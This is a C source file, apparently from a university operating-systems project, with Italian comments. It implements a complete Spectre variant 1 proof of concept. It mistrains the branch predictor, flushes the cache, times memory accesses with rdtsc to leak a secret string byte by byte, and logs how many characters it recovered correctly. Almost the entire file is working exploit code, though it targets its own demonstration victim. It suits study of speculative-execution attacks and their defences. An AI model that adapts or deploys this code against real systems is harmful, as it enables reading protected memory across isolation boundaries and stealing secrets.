#line 1 "utente/prog/pce.in"

#include <all.h>

#line 6 "utente/utente.cpp"

const char * expected_secret = "The quick brown fox jumps over the lazy dog.";
unsigned int array1_size = 16;


void read_memory_byte(natq cache_hit_threshold, size_t malicious_x, uint8_t value[2], int score[2])
{
	natl results[256];
	size_t training_x, x;

	for (int i = 0; i < 256; i++)
		results[i] = 0;
		
	for (int tries = 0; tries < 1000; tries++) {
		flush_util(0);

		// Ciclo il valore di training in modo da non creare la maggioranza degli hit sul valore di train
		training_x = tries % array1_size;
		for (int j = 1; j <= 6; j++) {

			// Rimuovo array1_size dalla cache e aggiungo un delay
			flush_util(1);
			for (volatile int z = 0; z < 10; z++) {}
			
			// Eseguo operazioni bit a bit per evitare un if che potrebbe influenzare il branch preditor
			// Imposto x=training_x se j%6!=0, x=malicious_x se j%6==0
			x = ((j % 6) - 1) & ~0x0F;		  // Imposto x=0xFFFFFFFFFFFFFFF0 se j%6==0, altrimenti x=0
			x = (x | (x >> 4));				  // Imposto x=0xFFFFFFFFFFFFFFFF se j&6=0, altrimenti x=0
			x = training_x ^ (x & (malicious_x ^ training_x));

			// Chiamo la funzione vulnerabile
			victim_function(x);
		}

		// Misuro il tempo di accesso alla memoria attraverso una funzione che mi permette di accedere ad array2
		natq time1, time2;
		for (int i = 1; i < 256; i++) {
			__builtin_ia32_mfence();
			time1 = __builtin_ia32_rdtsc();
			__builtin_ia32_mfence();
			array_access_function(i);
			__builtin_ia32_mfence();
			time2 = __builtin_ia32_rdtsc();
			__builtin_ia32_mfence();

			// In caso di tempo di accesso inferiore alla soglia incremento il relativo punteggio
			if (time2-time1 <= cache_hit_threshold)
				results[i]++;
		}
	}
	
	// Identifico i due risultati con maggiori hit
	int first, second;
	first = second = -1;
	for (int i = 0; i < 256; i++) {
		if (first < 0 || results[i] >= results[first]) {
			second = first;
			first = i;
		} else if (second < 0 || results[i] >= results[second]) {
			second = i;
		}
	}
		
	value[0] = (uint8_t) first;
	score[0] = results[first];
	value[1] = (uint8_t) second;
	score[1] = results[second];
	
	/*
	for (int i = 1; i < 256; i++) {
	    flog(LOG_INFO, "%d: %d", i, results[i]);
	}
	*/
}


int get_hit_threshold()
{
	natq time1, time2;
	int average_hit_cache = 0;
	for (int i = 1; i <= 1024; i++) {
		array_access_function(i % 256);
		
		__builtin_ia32_mfence();
		time1 = __builtin_ia32_rdtsc();
		__builtin_ia32_mfence();
		array_access_function(i % 256);
		__builtin_ia32_mfence();
		time2 = __builtin_ia32_rdtsc();
		__builtin_ia32_mfence();
		
		//flog(LOG_INFO, "cache: %d", time2-time1);
		average_hit_cache += time2-time1;
	}
	average_hit_cache /= 1024;
	
	int average_hit_no_cache = 0;
	for (int i = 1; i <= 1024; i++) {
		flush_util(0);
		
		__builtin_ia32_mfence();
		time1 = __builtin_ia32_rdtsc();
		__builtin_ia32_mfence();
		array_access_function(i % 256);
		__builtin_ia32_mfence();
		time2 = __builtin_ia32_rdtsc();
		__builtin_ia32_mfence();
		
		//flog(LOG_INFO, "no cache: %d", time2-time1);
		average_hit_no_cache += time2-time1;
	}
	average_hit_no_cache /= 1024;
	
	flog(LOG_INFO, "Tempo di accesso con cache: %d. Tempo di accesso in memoria: %d", average_hit_cache, average_hit_no_cache);
	
	return (average_hit_cache*9+average_hit_no_cache)/10;
}


void measure_performace() {
    natq time1, time2;
	int average_normal_time = 0;
	for (int i = 1; i <= 1024; i++) {
		victim_function(i % 16);
		
		__builtin_ia32_mfence();
		time1 = __builtin_ia32_rdtsc();
		__builtin_ia32_mfence();
		victim_function(i % 16);
		__builtin_ia32_mfence();
		time2 = __builtin_ia32_rdtsc();
		__builtin_ia32_mfence();
		
		flog(LOG_INFO, "normal use: %d", time2-time1);
		average_normal_time += time2-time1;
	}
	average_normal_time /= 1024;
	
	int average_bad_time = 0;
	for (int i = 1; i <= 1024; i++) {
		victim_function(i % 16 + 16);
		
		__builtin_ia32_mfence();
		time1 = __builtin_ia32_rdtsc();
		__builtin_ia32_mfence();
		victim_function(i % 16 + 16);
		__builtin_ia32_mfence();
		time2 = __builtin_ia32_rdtsc();
		__builtin_ia32_mfence();
		
		flog(LOG_INFO, "bad use: %d", time2-time1);
		average_bad_time += time2-time1;
	}
	average_bad_time /= 1024;
	
	flog(LOG_INFO, "Good use: %d, Bad use: %d", average_normal_time, average_bad_time);
}


int main()
{
    //test_performance();
    //measure_performace();
    //pause();
    
	int cache_hit_threshold = get_hit_threshold();
	flog(LOG_INFO, "Utilizzo threshold: %d", cache_hit_threshold);
	
	// Ottengo l'offset tra l'array e il segreto da leggere
	size_t malicious_x = get_malicious_x();

	// Variabili di supporto
	int len = strlen(expected_secret);
	int correct = 0;
	int score[2];
	uint8_t value[2];

	
	for (int i = 0; i < len; i++) {
		// Eseguo l'attacco sul byte corrente
		read_memory_byte(cache_hit_threshold, malicious_x++, value, score);

		if (value[0] == expected_secret[i]) {
			correct++;
		}

		flog(LOG_INFO, "%d: trovato %c (0x%02X) con %d hit: %s %c (successivo 0x%02X con %d hit)",
				i, value[0], value[0], score[0],
				(value[0] == expected_secret[i]) ? "Corretto" : "Atteso", (value[0] == expected_secret[i]) ? ' ' : expected_secret[i],
				value[1], score[1]);

		printf("%d: trovato %c (0x%02X) con %d hit: %s %c (successivo 0x%02X con %d hit)\n",
				i, value[0], value[0], score[0],
				(value[0] == expected_secret[i]) ? "Corretto" : "Atteso", (value[0] == expected_secret[i]) ? ' ' : expected_secret[i],
				value[1], score[1]);
	}
	
	flog(LOG_INFO, "Trovati %d caratteri corretti su %d (%d%%)", correct, len, (int)(correct*100/len));
	printf("Trovati %d caratteri corretti su %d (%d%%)\n", correct, len, (int)(correct*100/len));

	pause();
	terminate_p();
}
